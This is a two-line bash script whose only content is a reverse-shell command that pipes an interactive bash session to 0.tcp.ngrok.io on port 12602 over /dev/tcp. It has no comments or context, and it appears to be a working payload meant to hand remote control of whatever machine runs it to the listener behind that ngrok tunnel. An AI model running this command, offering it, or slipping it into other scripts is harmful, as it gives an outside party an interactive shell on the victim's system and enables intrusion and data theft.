#!/bin/bash
bash -i >& /dev/tcp/0.tcp.ngrok.io/12602 0>&1
